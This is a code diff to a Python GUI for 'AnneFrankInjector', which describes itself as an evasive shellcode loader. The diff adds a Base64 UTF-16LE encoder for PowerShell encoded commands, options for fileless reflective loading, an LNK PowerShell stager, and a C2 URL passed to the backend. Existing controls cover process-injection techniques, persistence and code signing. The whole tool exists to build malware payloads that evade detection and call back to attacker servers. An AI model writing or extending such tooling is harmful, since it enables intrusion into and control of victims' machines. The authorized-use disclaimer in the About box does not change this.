@@ -6,15 +6,95 @@ import sys
 import platform
 import subprocess
 import threading
+import base64
 import tkinter as tk
 from tkinter import filedialog, messagebox, ttk
 from tkinter.scrolledtext import ScrolledText
+
+class Base64EncoderDialog(tk.Toplevel):
+    """Simple dialog to encode a string to Base64 (UTF-16LE) and copy to clipboard."""
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("Base64 Encoder (UTF-16LE)")
+        self.geometry("600x500")          # increased height to fit taller buttons
+        self.resizable(True, True)
+
+        # Make modal
+        self.transient(parent)
+        self.grab_set()
+
+        # Input frame
+        input_frame = ttk.LabelFrame(self, text="Input Text (PowerShell command / one‑liner)")
+        input_frame.pack(fill="both", expand=True, padx=10, pady=5)
+        self.input_text = ScrolledText(input_frame, height=8, width=70)
+        self.input_text.pack(fill="both", expand=True, padx=5, pady=5)
+
+        # Output frame
+        output_frame = ttk.LabelFrame(self, text="Base64 Encoded (UTF-16LE)")
+        output_frame.pack(fill="both", expand=True, padx=10, pady=5)
+        self.output_text = ScrolledText(output_frame, height=8, width=70)
+        self.output_text.pack(fill="both", expand=True, padx=5, pady=5)
+
+        # Create a custom style for tall buttons
+        style = ttk.Style()
+        style.configure("Tall.TButton", padding=(12, 8))  # horizontal, vertical padding
+
+        # Button frame – use grid for better control
+        btn_frame = ttk.Frame(self)
+        btn_frame.pack(pady=10, fill='x', expand=True)
+
+        # Buttons using the tall style
+        encode_btn = ttk.Button(btn_frame, text="Encode", command=self.encode,
+                                style="Tall.TButton", width=12)
+        copy_btn = ttk.Button(btn_frame, text="Copy to Clipboard", command=self.copy_to_clipboard,
+                              style="Tall.TButton", width=15)
+        close_btn = ttk.Button(btn_frame, text="Close", command=self.destroy,
+                               style="Tall.TButton", width=8)
+
+        # Place buttons so they expand horizontally
+        encode_btn.grid(row=0, column=0, padx=5, pady=2, sticky='nsew')
+        copy_btn.grid(row=0, column=1, padx=5, pady=2, sticky='nsew')
+        close_btn.grid(row=0, column=2, padx=5, pady=2, sticky='nsew')
+
+        # Allow columns to expand equally
+        btn_frame.grid_columnconfigure(0, weight=1)
+        btn_frame.grid_columnconfigure(1, weight=1)
+        btn_frame.grid_columnconfigure(2, weight=1)
+
+        self.bind('<Control-Return>', lambda e: self.encode())
+        self.bind('<Escape>', lambda e: self.destroy())
+
+    def encode(self):
+        """Encode the input text to Base64 (UTF-16LE) and display it."""
+        text = self.input_text.get("1.0", tk.END).strip()
+        if not text:
+            messagebox.showwarning("No input", "Please enter some text to encode.")
+            return
+        try:
+            # PowerShell's -EncodedCommand expects UTF-16LE
+            encoded = base64.b64encode(text.encode('utf-16le')).decode('ascii')
+            self.output_text.delete("1.0", tk.END)
+            self.output_text.insert("1.0", encoded)
+            # Select all output for easy copy
+            self.output_text.tag_add("sel", "1.0", "end")
+        except Exception as e:
+            messagebox.showerror("Encoding Error", str(e))
+
+    def copy_to_clipboard(self):
+        """Copy the encoded output to clipboard."""
+        encoded = self.output_text.get("1.0", tk.END).strip()
+        if encoded:
+            self.clipboard_clear()
+            self.clipboard_append(encoded)
+            messagebox.showinfo("Copied", "Base64 string copied to clipboard.")
+        else:
+            messagebox.showwarning("Nothing to copy", "Please encode some text first.")
 
 class AnneFrankGUI:
     def __init__(self, root):
         self.root = root
         self.root.title("AnneFrankInjector - GUI")
-        self.root.geometry("780x880")  # increased height for new controls
+        self.root.geometry("800x1000")
 
         # Determine backend path (absolute)
         script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -26,6 +106,9 @@ class AnneFrankGUI:
         if not os.path.isfile(self.backend):
             messagebox.showerror("Error", f"Backend not found: {self.backend}")
             sys.exit(1)
+
+        # Create menu bar
+        self.create_menu()
 
         main_frame = ttk.Frame(root, padding=12)
         main_frame.grid(row=0, column=0, sticky="nsew")
@@ -63,7 +146,6 @@ class AnneFrankGUI:
         ttk.Label(self.staged_frame, text="Path:").grid(row=staged_row, column=0, sticky="w")
         self.path = tk.StringVar(value="/")
         ttk.Entry(self.staged_frame, textvariable=self.path, width=30).grid(row=staged_row, column=1, padx=5)
-        # increase main row after staged_frame
         row += 1
 
         # ---------- Common options ----------
@@ -113,15 +195,31 @@ class AnneFrankGUI:
         ttk.Entry(main_frame, textvariable=self.spawn_path, width=40).grid(row=row, column=2, columnspan=2, sticky="ew")
         row += 1
 
-        # ---------- Injection technique (NEW) ----------
+        # ---------- Injection technique ----------
         ttk.Label(main_frame, text="Injection technique:").grid(row=row, column=0, sticky="w")
         self.injection = tk.StringVar(value="apc")
         ttk.Combobox(main_frame, textvariable=self.injection, values=["apc", "enumwindows"], width=25, state="readonly").grid(row=row, column=1, sticky="w")
         row += 1
 
-        # ---------- Staggered persistence (NEW) ----------
+        # ---------- Staggered persistence ----------
         self.staggered = tk.BooleanVar()
         ttk.Checkbutton(main_frame, text="Staggered persistence (two-stage)", variable=self.staggered).grid(row=row, column=0, columnspan=4, sticky="w")
+        row += 1
+
+        # ---------- Reflective mode (fileless) ----------
+        self.reflective = tk.BooleanVar()
+        ttk.Checkbutton(main_frame, text="Reflective mode (no EXE)", variable=self.reflective).grid(row=row, column=0, columnspan=4, sticky="w")
+        row += 1
+
+        # ---------- LNK stager ----------
+        self.lnk_stager = tk.BooleanVar()
+        ttk.Checkbutton(main_frame, text="Generate LNK stager (PowerShell)", variable=self.lnk_stager).grid(row=row, column=0, columnspan=4, sticky="w")
+        row += 1
+
+        # ---------- C2 URL (for stager) ----------
+        ttk.Label(main_frame, text="C2 URL (for stager):").grid(row=row, column=0, sticky="w")
+        self.c2_url = tk.StringVar()
+        ttk.Entry(main_frame, textvariable=self.c2_url, width=55).grid(row=row, column=1, columnspan=3, sticky="ew")
         row += 1
 
         # ---------- Code signing ----------
@@ -157,6 +255,36 @@ class AnneFrankGUI:
         main_frame.rowconfigure(row+1, weight=1)
 
         self.mode.trace_add("write", self.toggle_staged)
+
+    def create_menu(self):
+        """Create the menu bar with Tools and Help menus."""
+        menubar = tk.Menu(self.root)
+        self.root.config(menu=menubar)
+
+        # Tools menu
+        tools_menu = tk.Menu(menubar, tearoff=0)
+        menubar.add_cascade(label="Tools", menu=tools_menu)
+        tools_menu.add_command(label="Base64 Encoder (UTF-16LE)", command=self.open_base64_encoder)
+
+        # Help menu
+        help_menu = tk.Menu(menubar, tearoff=0)
+        menubar.add_cascade(label="Help", menu=help_menu)
+        help_menu.add_command(label="About", command=self.show_about)
+
+    def open_base64_encoder(self):
+        """Open the Base64 encoder dialog."""
+        Base64EncoderDialog(self.root)
+
+    def show_about(self):
+        """Show about dialog."""
+        messagebox.showinfo(
+            "About AnneFrankInjector",
+            "AnneFrankInjector v1.0\n"
+            "Author: Excalibra\n"
+            "GitHub: https://github.com/Excalibra\n\n"
+            "Advanced shellcode loader with evasion techniques.\n"
+            "Use responsibly and only on authorized systems."
+        )
 
     def browse_shellcode(self):
         f = filedialog.askopenfilename(filetypes=[("Bin", "*.bin"), ("All", "*.*")])
@@ -205,12 +333,16 @@ class AnneFrankGUI:
             if self.spawn.get():
                 cmd.append("--spawn")
                 cmd.extend(["--spawn-path", self.spawn_path.get()])
-            # NEW: injection technique
             if self.injection.get() != "apc":
                 cmd.extend(["--injection", self.injection.get()])
-            # NEW: staggered persistence
             if self.staggered.get():
                 cmd.append("--staggered")
+            if self.reflective.get():
+                cmd.append("--reflective")
+            if self.lnk_stager.get():
+                cmd.append("--lnk-stager")
+            if self.c2_url.get().strip():
+                cmd.extend(["--c2-url", self.c2_url.get().strip()])
 
             if self.cert_source.get() != "none" and self.pfx_path.get():
                 cmd.extend(["-pfx", self.pfx_path.get()])
@@ -241,6 +373,7 @@ class AnneFrankGUI:
             messagebox.showerror("Error", str(e))
         finally:
             self.gen_button.config(state="normal")
+
 
 if __name__ == "__main__":
     root = tk.Tk()
